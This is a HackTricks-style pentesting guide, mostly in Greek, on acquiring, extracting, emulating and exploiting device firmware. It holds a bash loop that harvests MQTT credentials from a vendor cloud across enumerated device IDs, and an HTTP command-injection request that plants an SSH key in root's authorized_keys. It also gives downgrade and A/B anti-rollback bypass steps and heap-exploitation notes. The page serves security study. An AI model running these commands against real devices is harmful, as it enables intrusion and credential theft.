# Ανάλυση Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Εισαγωγή**

### Σχετικοί πόροι


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Το Firmware είναι απαραίτητο λογισμικό που επιτρέπει στις συσκευές να λειτουργούν σωστά, διαχειριζόμενο και διευκολύνοντας την επικοινωνία μεταξύ των hardware components και του software με το οποίο αλληλεπιδρούν οι χρήστες. Αποθηκεύεται σε μόνιμη μνήμη, διασφαλίζοντας ότι η συσκευή μπορεί να έχει πρόσβαση σε ζωτικές οδηγίες από τη στιγμή που ενεργοποιείται, οδηγώντας στην εκκίνηση του operating system. Η εξέταση και η πιθανή τροποποίηση του firmware είναι ένα κρίσιμο βήμα για τον εντοπισμό security vulnerabilities.

## **Συλλογή Πληροφοριών**

Η **συλλογή πληροφοριών** είναι ένα κρίσιμο αρχικό βήμα για την κατανόηση της σύνθεσης μιας συσκευής και των τεχνολογιών που χρησιμοποιεί. Αυτή η διαδικασία περιλαμβάνει τη συλλογή δεδομένων για:

- Την CPU architecture και το operating system που εκτελεί
- Λεπτομέρειες του bootloader
- Διάταξη hardware και datasheets
- Μετρικές του codebase και τοποθεσίες του source
- Εξωτερικές libraries και τύπους license
- Ιστορικά updates και κανονιστικές πιστοποιήσεις
- Architectural and flow diagrams
- Security assessments και εντοπισμένα vulnerabilities

Για αυτόν τον σκοπό, τα εργαλεία **open-source intelligence (OSINT)** είναι ανεκτίμητα, όπως και η ανάλυση οποιωνδήποτε διαθέσιμων open-source software components μέσω διαδικασιών χειροκίνητου και αυτοματοποιημένου review. Εργαλεία όπως τα [Coverity Scan](https://scan.coverity.com) και [Semmle’s LGTM](https://lgtm.com/#explore) προσφέρουν δωρεάν static analysis που μπορεί να αξιοποιηθεί για τον εντοπισμό πιθανών issues.

## **Απόκτηση του Firmware**

Η απόκτηση firmware μπορεί να γίνει με διάφορους τρόπους, ο καθένας με το δικό του επίπεδο πολυπλοκότητας:

- **Απευθείας** από την πηγή (developers, manufacturers)
- **Building** από τις παρεχόμενες οδηγίες
- **Λήψη** από official support sites
- Χρήση **Google dork** queries για τον εντοπισμό hosted firmware files
- Άμεση πρόσβαση σε **cloud storage**, με εργαλεία όπως το [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Παρεμβολή στις **updates** μέσω τεχνικών man-in-the-middle
- **Extracting** από τη συσκευή μέσω συνδέσεων όπως **UART**, **JTAG** ή **PICit**
- **Sniffing** για update requests μέσα στην επικοινωνία της συσκευής
- Εντοπισμός και χρήση **hardcoded update endpoints**
- **Dumping** από το bootloader ή το δίκτυο
- **Αφαίρεση και ανάγνωση** του storage chip, όταν όλα τα άλλα αποτυγχάνουν, χρησιμοποιώντας κατάλληλα hardware tools

### UART-only logs: force a root shell via U-Boot env in flash

If UART RX is ignored (logs only), you can still force an init shell by **editing the U-Boot environment blob** offline:

1. Dump SPI flash with a SOIC-8 clip + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Locate the U-Boot env partition, edit `bootargs` to include `init=/bin/sh`, and **recompute the U-Boot env CRC32** for the blob.
3. Reflash only the env partition and reboot; a shell should appear on UART.

This is useful on embedded devices where the bootloader shell is disabled but the env partition is writable via external flash access.

## Ανάλυση του firmware

Τώρα που **έχεις το firmware**, πρέπει να εξαγάγεις πληροφορίες σχετικά με αυτό για να ξέρεις πώς να το χειριστείς. Διαφορετικά εργαλεία που μπορείς να χρησιμοποιήσεις για αυτό:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Αν δεν βρεις πολλά με αυτά τα tools, έλεγξε το **entropy** της image με `binwalk -E <bin>`· αν είναι χαμηλό, τότε μάλλον δεν είναι encrypted. Αν είναι υψηλό, μάλλον είναι encrypted (ή compressed με κάποιον τρόπο).

Επιπλέον, μπορείς να χρησιμοποιήσεις αυτά τα tools για να εξάγεις **files embedded inside the firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ή το [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) για να επιθεωρήσεις το file.

### Getting the Filesystem

Με τα προηγούμενα commented tools όπως `binwalk -ev <bin>` θα έπρεπε να έχεις καταφέρει να **extract the filesystem**.\
Το Binwalk συνήθως το κάνει extract μέσα σε έναν **folder named as the filesystem type**, που συνήθως είναι ένα από τα ακόλουθα: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manual Filesystem Extraction

Μερικές φορές, το binwalk **δεν θα έχει το magic byte of the filesystem στα signatures του**. Σε αυτές τις περιπτώσεις, χρησιμοποίησε το binwalk για να **βρεις το offset of the filesystem και carve το compressed filesystem** από το binary και να το **extract manually** σύμφωνα με τον τύπο του, χρησιμοποιώντας τα παρακάτω βήματα.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Εκτελέστε την ακόλουθη **dd command** για carving του Squashfs filesystem.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Εναλλακτικά, η ακόλουθη εντολή μπορεί επίσης να εκτελεστεί.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Για squashfs (χρησιμοποιείται στο παραπάνω παράδειγμα)

`$ unsquashfs dir.squashfs`

Τα αρχεία θα βρίσκονται afterward στον κατάλογο "`squashfs-root`".

- CPIO archive files

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Για jffs2 filesystems

`$ jefferson rootfsfile.jffs2`

- Για ubifs filesystems με NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Αναλύοντας Firmware

Μόλις αποκτηθεί το firmware, είναι απαραίτητο να αποσυναρμολογηθεί για να γίνει κατανοητή η δομή του και οι πιθανές ευπάθειες. Αυτή η διαδικασία περιλαμβάνει τη χρήση διαφόρων εργαλείων για την ανάλυση και την εξαγωγή πολύτιμων δεδομένων από το firmware image.

### Initial Analysis Tools

Παρέχεται ένα σύνολο εντολών για αρχικό έλεγχο του binary file (αναφέρεται ως `<bin>`). Αυτές οι εντολές βοηθούν στην αναγνώριση file types, στην εξαγωγή strings, στην ανάλυση binary data και στην κατανόηση των λεπτομερειών του partition και του filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Για να αξιολογηθεί η κατάσταση κρυπτογράφησης της εικόνας, ελέγχεται η **entropy** με `binwalk -E <bin>`. Η χαμηλή entropy υποδηλώνει έλλειψη κρυπτογράφησης, ενώ η υψηλή entropy δείχνει πιθανή κρυπτογράφηση ή συμπίεση.

Για την εξαγωγή **embedded files**, προτείνονται εργαλεία και πόροι όπως η τεκμηρίωση **file-data-carving-recovery-tools** και το **binvis.io** για επιθεώρηση αρχείων.

### Extracting the Filesystem

Χρησιμοποιώντας `binwalk -ev <bin>`, μπορεί συνήθως να εξαχθεί το filesystem, συχνά σε έναν κατάλογο ονομασμένο σύμφωνα με τον τύπο του filesystem (π.χ. squashfs, ubifs). Ωστόσο, όταν το **binwalk** αποτυγχάνει να αναγνωρίσει τον τύπο του filesystem λόγω έλλειψης magic bytes, απαιτείται χειροκίνητη εξαγωγή. Αυτό περιλαμβάνει τη χρήση του `binwalk` για τον εντοπισμό του offset του filesystem, ακολουθούμενο από την εντολή `dd` για την αποκοπή του filesystem:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Στη συνέχεια, ανάλογα με τον τύπο του filesystem (π.χ., squashfs, cpio, jffs2, ubifs), χρησιμοποιούνται διαφορετικές εντολές για τη χειροκίνητη εξαγωγή του περιεχομένου.

### Ανάλυση filesystem

Μετά την εξαγωγή του filesystem, ξεκινά η αναζήτηση για security flaws. Δίνεται προσοχή σε insecure network daemons, hardcoded credentials, API endpoints, λειτουργίες update server, μη μεταγλωττισμένο code, startup scripts και compiled binaries για offline analysis.

**Βασικές τοποθεσίες** και **αντικείμενα** που πρέπει να ελεγχθούν περιλαμβάνουν:

- **etc/shadow** και **etc/passwd** για user credentials
- SSL certificates και keys στο **etc/ssl**
- Configuration και script files για πιθανές vulnerabilities
- Embedded binaries για περαιτέρω analysis
- Common IoT device web servers και binaries

Πολλά tools βοηθούν στην αποκάλυψη sensitive information και vulnerabilities μέσα στο filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) και [**Firmwalker**](https://github.com/craigz28/firmwalker) για αναζήτηση sensitive information
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) για comprehensive firmware analysis
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go), και [**EMBA**](https://github.com/e-m-b-a/emba) για static και dynamic analysis

### Security Checks σε Compiled Binaries

Τόσο ο source code όσο και τα compiled binaries που βρίσκονται στο filesystem πρέπει να εξετάζονται προσεκτικά για vulnerabilities. Tools όπως το **checksec.sh** για Unix binaries και το **PESecurity** για Windows binaries βοηθούν στον εντοπισμό unprotected binaries που θα μπορούσαν να αξιοποιηθούν.

## Harvesting cloud config and MQTT credentials via derived URL tokens

Πολλά IoT hubs αντλούν το per-device configuration τους από ένα cloud endpoint που μοιάζει με:

- `https://<api-host>/pf/<deviceId>/<token>`

Κατά την analysis του firmware μπορεί να διαπιστώσετε ότι το `<token>` παράγεται τοπικά από το device ID χρησιμοποιώντας ένα hardcoded secret, για παράδειγμα:

- token = MD5( deviceId || STATIC_KEY ) και αναπαρίσταται ως uppercase hex

Αυτό το design επιτρέπει σε οποιονδήποτε μάθει ένα deviceId και το STATIC_KEY να ανακατασκευάσει το URL και να αντλήσει cloud config, αποκαλύπτοντας συχνά plaintext MQTT credentials και topic prefixes.

Practical workflow:

1) Extract deviceId from UART boot logs

- Connect a 3.3V UART adapter (TX/RX/GND) and capture logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Αναζητήστε γραμμές που τυπώνουν το pattern του cloud config URL και τη διεύθυνση του broker, για παράδειγμα:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Ανάκτησε το STATIC_KEY και τον αλγόριθμο token από το firmware

- Φόρτωσε τα binaries σε Ghidra/radare2 και αναζήτησε το config path ("/pf/") ή χρήση MD5.
- Επιβεβαίωσε τον αλγόριθμο (π.χ. MD5(deviceId||STATIC_KEY)).
- Παράγαγε το token σε Bash και κάνε uppercase το digest:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Συλλογή cloud config και MQTT credentials

- Compose το URL και κατέβασε JSON με curl; κάνε parse με jq για να εξαγάγεις secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Κατάχρηση plaintext MQTT και αδύναμων topic ACLs (αν υπάρχουν)

- Χρησιμοποίησε τα ανακτημένα credentials για να κάνεις subscribe σε maintenance topics και να αναζητήσεις sensitive events:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Απαρίθμησε προβλέψιμα device IDs (σε κλίμακα, με authorization)

- Πολλά ecosystems ενσωματώνουν vendor OUI/product/type bytes ακολουθούμενα από ένα sequential suffix.
- Μπορείς να κάνεις iterate candidate IDs, να derive tokens και να fetch configs programmatically:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Σημειώσεις
- Πάντα να λαμβάνετε ρητή εξουσιοδότηση πριν επιχειρήσετε mass enumeration.
- Προτιμήστε emulation ή static analysis για να ανακτήσετε secrets χωρίς να τροποποιήσετε το target hardware όταν είναι δυνατό.

Η διαδικασία emulating firmware επιτρέπει **dynamic analysis** είτε της λειτουργίας μιας συσκευής είτε ενός μεμονωμένου προγράμματος. Αυτή η προσέγγιση μπορεί να αντιμετωπίσει προκλήσεις με εξαρτήσεις από hardware ή architecture, αλλά η μεταφορά του root filesystem ή συγκεκριμένων binaries σε μια συσκευή με matching architecture και endianness, όπως ένα Raspberry Pi, ή σε ένα pre-built virtual machine, μπορεί να διευκολύνει περαιτέρω testing.

### Emulating Individual Binaries

Για την εξέταση μεμονωμένων προγραμμάτων, είναι κρίσιμο να εντοπιστούν το endianness και η CPU architecture του προγράμματος.

#### Example with MIPS Architecture

Για να emulate ένα binary αρχιτεκτονικής MIPS, μπορεί κανείς να χρησιμοποιήσει την εντολή:
```bash
file ./squashfs-root/bin/busybox
```
Και για να εγκαταστήσετε τα απαραίτητα emulation tools:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Για MIPS (big-endian), χρησιμοποιείται το `qemu-mips`, και για little-endian binaries, το `qemu-mipsel` θα ήταν η επιλογή.

#### ARM Architecture Emulation

Για ARM binaries, η διαδικασία είναι παρόμοια, με τον emulator `qemu-arm` να χρησιμοποιείται για emulation.

### Full System Emulation

Εργαλεία όπως [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit), και άλλα, διευκολύνουν το full firmware emulation, αυτοματοποιώντας τη διαδικασία και βοηθώντας στο dynamic analysis.

## Dynamic Analysis in Practice

Σε αυτό το στάδιο, χρησιμοποιείται είτε ένα πραγματικό είτε ένα emulated device environment για analysis. Είναι απαραίτητο να διατηρείται shell access στο OS και το filesystem. Το emulation μπορεί να μην μιμείται τέλεια τις hardware interactions, απαιτώντας περιστασιακά επανεκκινήσεις του emulation. Το analysis θα πρέπει να επανεξετάζει το filesystem, να εκμεταλλεύεται exposed webpages και network services, και να εξερευνά bootloader vulnerabilities. Τα firmware integrity tests είναι κρίσιμα για τον εντοπισμό πιθανών backdoor vulnerabilities.

## Runtime Analysis Techniques

Το runtime analysis περιλαμβάνει αλληλεπίδραση με μια process ή binary στο operating environment του, χρησιμοποιώντας εργαλεία όπως gdb-multiarch, Frida, και Ghidra για τον ορισμό breakpoints και τον εντοπισμό vulnerabilities μέσω fuzzing και άλλων τεχνικών.

Για embedded targets χωρίς full debugger, **αντιγράψτε ένα statically-linked `gdbserver`** στη συσκευή και συνδεθείτε remotely:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Zigbee / radio-co-processor message mapping

Στα IoT hubs το RF stack συχνά χωρίζεται μεταξύ ενός **radio MCU** και ενός Linux userland process. Ένα χρήσιμο workflow είναι να χαρτογραφήσεις τη διαδρομή:

1. **RF frame** στον αέρα
2. **controller-side parser** στο radio MCU
3. **serial/UART text or TLV protocol** που προωθείται στο Linux (για παράδειγμα `/dev/tty*`)
4. **application dispatcher** στο main daemon
5. **protocol-specific handler / state machine**

Αυτή η αρχιτεκτονική δημιουργεί δύο reversing targets αντί για ένα. Αν ο controller μετατρέπει binary radio frames σε ένα textual protocol όπως `Group,Command,arg1,arg2,...`, ανακάλυψε:

- Τα **message groups** και τους dispatch tables
- Ποια messages μπορούν να έρθουν από το **network** versus τον ίδιο τον controller
- Τα ακριβή **manufacturer-specific discriminator fields** (για παράδειγμα Zigbee `manufacturer_code` και custom `cluster_command`)
- Ποιοι handlers είναι reachable μόνο κατά τη διάρκεια **commissioning**, discovery, ή firmware/model download phases

Συγκεκριμένα για Zigbee, κατέγραψε pairing traffic και έλεγξε αν ο στόχος εξακολουθεί να βασίζεται στο default **Link Key** `ZigBeeAlliance09`. Αν ναι, το sniffing του commissioning traffic μπορεί να αποκαλύψει το **Network Key**. Τα Zigbee 3.0 install codes μειώνουν αυτή την έκθεση, οπότε σημείωσε αν η συσκευή που δοκιμάζεται τα επιβάλλει πραγματικά.

### Manufacturer-specific protocol handlers and FSM-gated reachability

Vendor-specific Zigbee/ZCL commands είναι συχνά καλύτερος στόχος από τα standardized clusters επειδή τροφοδοτούν **custom parsing code** και εσωτερικά **FSMs** με λιγότερο δοκιμασμένη validation.

Πρακτικό workflow:

- Reverse τον command dispatcher μέχρι να βρεις τον **vendor-only handler**.
- Ανακάλυψε τους **FSM state**, **event**, **check**, **action**, και **next-state** tables.
- Εντόπισε **transitional states** που auto-advance και retry/error branches που τελικά reset ή free attacker-controlled state.
- Επιβεβαίωσε ποια νόμιμα protocol exchanges απαιτούνται για να βάλεις το daemon στην ευάλωτη κατάσταση αντί να υποθέτεις ότι ο buggy handler είναι πάντα reachable.

Για timing-sensitive protocols, packet replay από Python framework μπορεί να είναι πολύ αργό. Μια πιο αξιόπιστη προσέγγιση είναι να emulate ένα νόμιμο device σε real hardware (για παράδειγμα ένα **nRF52840**) με vendor-grade stack ώστε να μπορείς να εκθέσεις τα σωστά **endpoints**, **attributes**, και commissioning timing.

### Fragmented-download bug class in embedded daemons

Μια επαναλαμβανόμενη firmware bug class εμφανίζεται σε **fragmented blob/model/configuration downloads**:

1. Το **first fragment** (`offset == 0`) αποθηκεύει `ctx->total_size` και κάνει allocate `malloc(total_size)`.
2. Τα επόμενα fragments μόνο validάρουν τα attacker-controlled **packet-local** fields όπως `packet_total_size >= offset + chunk_len`.
3. Το copy χρησιμοποιεί `memcpy(&ctx->buffer[offset], chunk, chunk_len)` χωρίς έλεγχο ως προς το **original allocated size**.

Αυτό επιτρέπει σε έναν attacker να στείλει:

- Ένα πρώτο valid fragment με ένα **μικρό** δηλωμένο total size ώστε να αναγκάσει ένα μικρό heap allocation.
- Ένα μεταγενέστερο fragment με το **αναμενόμενο offset** αλλά μεγαλύτερο `chunk_len`.
- Ένα forged packet-local size που ικανοποιεί τους νέους ελέγχους ενώ εξακολουθεί να overflow-άρει το αρχικά allocated buffer.

Όταν το vulnerable path βρίσκεται πίσω από commissioning logic, η exploitation πρέπει να περιλαμβάνει αρκετό **device emulation** ώστε να οδηγήσει τον στόχο στην αναμενόμενη model-download ή blob-download κατάσταση πριν σταλούν τα malformed fragments.

### Protocol-driven `free()` triggers

Σε embedded daemons, ο πιο εύκολος τρόπος να ενεργοποιήσεις heap metadata exploitation δεν είναι συχνά το "περίμενε για cleanup" αλλά το **force το protocol's own error handling**:

- Στείλε malformed follow-up fragments για να σπρώξεις το FSM σε **retry** ή **error** states.
- Ξεπέρασε το retry threshold ώστε το daemon να **resets context** και να free-άρει το corrupted buffer.
- Χρησιμοποίησε αυτό το προβλέψιμο `free()` για να ενεργοποιήσεις allocator-side primitives πριν το process crash-άρει για άσχετους λόγους.

Αυτό είναι ιδιαίτερα χρήσιμο εναντίον **musl/uClibc/dlmalloc-like** allocators σε embedded Linux, όπου το να corruptάρεις chunk metadata μπορεί να μετατρέψει το unlink/unbin logic σε write primitive. Ένα σταθερό pattern είναι να corruptάρεις ένα **size field** για να ανακατευθύνεις το allocator traversal σε **fake chunks staged inside the overflowed buffer**, αντί να καταστρέψεις αμέσως πραγματικά bin pointers και να crash-άρει το process.

## Binary Exploitation and Proof-of-Concept

Η ανάπτυξη ενός PoC για εντοπισμένα vulnerabilities απαιτεί βαθιά κατανόηση της target architecture και προγραμματισμό σε χαμηλότερου επιπέδου languages. Τα binary runtime protections σε embedded systems είναι σπάνια, αλλά όταν υπάρχουν, τεχνικές όπως Return Oriented Programming (ROP) μπορεί να είναι απαραίτητες.

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** Η uClibc χρησιμοποιεί fastbins παρόμοια με τη glibc. Μια μεταγενέστερη μεγάλη allocation μπορεί να ενεργοποιήσει `__malloc_consolidate()`, οπότε οποιοδήποτε fake chunk πρέπει να επιβιώσει τους checks (sane size, `fd = 0`, και τα γύρω chunks να φαίνονται ως "in use").
- **Non-PIE binaries under ASLR:** αν το ASLR είναι ενεργό αλλά το main binary είναι **non-PIE**, οι in-binary `.data/.bss` addresses είναι σταθερές. Μπορείς να στοχεύσεις μια περιοχή που ήδη μοιάζει με valid heap chunk header ώστε να προσγειώσεις ένα fastbin allocation σε έναν **function pointer table**.
- **Parser-stopping NUL:** όταν γίνεται parse JSON, ένα `\x00` στο payload μπορεί να σταματήσει το parsing ενώ κρατά τα trailing attacker-controlled bytes για ένα stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** ένα ROP chain που καλεί `open("/proc/self/mem")`, `lseek()`, και `write()` μπορεί να τοποθετήσει executable shellcode σε ένα γνωστό mapping και να κάνει jump σε αυτό.

## Prepared Operating Systems for Firmware Analysis

Operating systems όπως τα [AttifyOS](https://github.com/adi0x90/attifyos) και [EmbedOS](https://github.com/scriptingxss/EmbedOS) παρέχουν pre-configured environments για firmware security testing, εξοπλισμένα με τα απαραίτητα tools.

## Prepared OSs to analyze Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): Το AttifyOS είναι ένα distro σχεδιασμένο για να σε βοηθά να κάνεις security assessment και penetration testing σε Internet of Things (IoT) devices. Σου εξοικονομεί πολύ χρόνο παρέχοντας ένα pre-configured environment με όλα τα απαραίτητα tools φορτωμένα.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Embedded security testing operating system βασισμένο σε Ubuntu 18.04 με προφορτωμένα firmware security testing tools.

## Firmware Downgrade Attacks & Insecure Update Mechanisms

Ακόμα και όταν ένας vendor υλοποιεί cryptographic signature checks για firmware images, η **version rollback (downgrade) protection** συχνά παραλείπεται. Όταν ο boot- ή recovery-loader μόνο επαληθεύει τη signature με ένα embedded public key αλλά δεν συγκρίνει την *version* (ή έναν monotonic counter) του image που γίνεται flashed, ένας attacker μπορεί νόμιμα να εγκαταστήσει ένα **older, vulnerable firmware that still bears a valid signature** και έτσι να επαναφέρει patched vulnerabilities.

Typical attack workflow:

1. **Obtain an older signed image**
* Πάρε το από το vendor’s public download portal, CDN ή support site.
* Extract it από companion mobile/desktop applications (π.χ. μέσα σε ένα Android APK στο `assets/firmware/`).
* Retrieve it από third-party repositories όπως VirusTotal, Internet archives, forums, κ.λπ.
2. **Upload or serve the image to the device** μέσω οποιουδήποτε exposed update channel:
* Web UI, mobile-app API, USB, TFTP, MQTT, κ.λπ.
* Πολλά consumer IoT devices εκθέτουν *unauthenticated* HTTP(S) endpoints που δέχονται Base64-encoded firmware blobs, τα decode-άρουν server-side και ενεργοποιούν recovery/upgrade.
3. Μετά το downgrade, εκμεταλλεύσου μια vulnerability που είχε patched στο νεότερο release (για παράδειγμα ένα command-injection filter που προστέθηκε αργότερα).
4. Προαιρετικά flash-άρισε πάλι το πιο πρόσφατο image ή απενεργοποίησε τις updates για να αποφύγεις την ανίχνευση μόλις αποκτηθεί persistence.

### Example: Command Injection After Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
Στο ευάλωτο (υποβαθμισμένο) firmware, η παράμετρος `md5` συνενώνεται απευθείας σε μια shell command χωρίς sanitisation, επιτρέποντας injection αυθαίρετων commands (εδώ – enabling SSH key-based root access). Οι νεότερες εκδόσεις firmware εισήγαγαν ένα βασικό character filter, αλλά η απουσία downgrade protection καθιστά τη διόρθωση moot.

### Extracting Firmware From Mobile Apps

Πολλοί vendors πακετάρουν πλήρη firmware images μέσα στις companion mobile applications τους, ώστε η app να μπορεί να ενημερώνει τη συσκευή μέσω Bluetooth/Wi‑Fi. Αυτά τα packages συνήθως αποθηκεύονται unencrypted στο APK/APEX σε paths όπως `assets/fw/` ή `res/raw/`. Tools όπως `apktool`, `ghidra`, ή ακόμη και το plain `unzip` σάς επιτρέπουν να pull signed images χωρίς να αγγίξετε το φυσικό hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Παράκαμψη anti-rollback μόνο από updater σε σχέδια A/B slot

Ορισμένοι vendors υλοποιούν ένα anti-downgrade **ratchet**, αλλά μόνο μέσα στη λογική του *updater* (για παράδειγμα ένα UDS routine over CAN, μια recovery command, ή ένας userspace OTA agent). Αν το **bootloader** αργότερα ελέγχει μόνο το image signature/CRC και εμπιστεύεται τον partition table ή τα slot metadata, η rollback protection μπορεί ακόμα να παρακαμφθεί.

Τυπικό αδύναμο design:

- Τα firmware metadata περιέχουν τόσο έναν version descriptor όσο και ένα **security ratchet** / monotonic counter.
- Ο updater συγκρίνει το image ratchet με μια τιμή αποθηκευμένη σε persistent storage και απορρίπτει παλαιότερα signed images.
- Το bootloader δεν κάνει parse αυτό το ratchet και ελέγχει μόνο header, CRC, και signature πριν κάνει boot το επιλεγμένο slot.
- Η ενεργοποίηση του slot αποθηκεύεται ξεχωριστά σε έναν partition table ή per-slot generation counter και δεν είναι **cryptographically bound** στο ακριβές firmware digest που επικυρώθηκε.

Αυτό δημιουργεί ένα **validate-one-image / boot-another-image** primitive σε dual-slot systems. Αν ο attacker μπορεί να κάνει το updater να σημειώσει το slot B ως το επόμενο boot target χρησιμοποιώντας ένα current signed image, και αργότερα μπορεί να overwrite το slot B πριν το reboot, το bootloader μπορεί να κάνει ακόμα boot το downgraded image επειδή εμπιστεύεται μόνο τα ήδη committed slot metadata.

Συνηθισμένο abuse pattern:

1. Upload ένα **current signed** firmware στο passive slot και εκτέλεσε το κανονικό validation/switch routine ώστε το layout να σημειώσει αυτό το slot ως next active.
2. **Μην κάνεις reboot ακόμα**. Μπες ξανά στο slot-preparation/erase routine στην ίδια session.
3. Εκμεταλλεύσου stale boot-state ή stale slot-selection logic ώστε ο updater να σβήσει το **ίδιο physical slot** που μόλις promoted.
4. Γράψε ένα **older but still signed** firmware σε αυτό το slot.
5. Παράλειψε το validation routine που επιβάλλει το ratchet και κάνε reboot απευθείας.
6. Το bootloader επιλέγει το promoted slot, ελέγχει μόνο signature/integrity, και κάνει boot το παλιό image.

Τι να ψάχνεις όταν κάνεις reverse A/B update implementations:

- Slot selection που προκύπτει από **boot-time flags** τα οποία δεν ανανεώνονται μετά από ένα επιτυχημένο switch.
- Ένα `prepare_passive_slot()`-style routine που σβήνει ένα slot με βάση stale state αντί για το **current committed layout**.
- Μια `part_write_layout()`-style function που απλώς αυξάνει έναν **generation counter** / active flag και δεν αποθηκεύει το validated image hash.
- Ratchet checks υλοποιημένα σε userspace ή updater code, αλλά **όχι** σε ROM / bootloader / secure boot stages.
- Erase ή recovery routines που αφήνουν το slot σημειωμένο ως bootable ακόμα και αφού το περιεχόμενό του διαγράφηκε και ξαναγράφηκε.

### Checklist για Αξιολόγηση Update Logic

* Είναι επαρκώς προστατευμένο το transport/authentication του *update endpoint* (TLS + authentication);
* Συγκρίνει η συσκευή **version numbers** ή έναν **monotonic anti-rollback counter** πριν το flashing;
* Επικυρώνεται το image μέσα σε secure boot chain (π.χ. signatures ελέγχονται από ROM code);
* Εφαρμόζει το **bootloader το ίδιο ratchet** με το updater, αντί να ελέγχει μόνο signature/CRC;
* Είναι τα slot activation metadata **bound to** το validated firmware digest/version, ή μπορεί να τροποποιηθεί ένα slot μετά το promotion;
* Αφού πετύχει ένα slot switch, αναγκάζεται η συσκευή να κάνει reboot ή παραμένουν reachable later update/erase routines στην ίδια session;
* Εκτελεί ο userland code επιπλέον sanity checks (π.χ. allowed partition map, model number);
* Χρησιμοποιούν τα *partial* ή *backup* update flows την ίδια validation logic;

> 💡  Αν κάποιο από τα παραπάνω λείπει, η platform είναι πιθανότατα vulnerable σε rollback attacks.

## Vulnerable firmware για practice

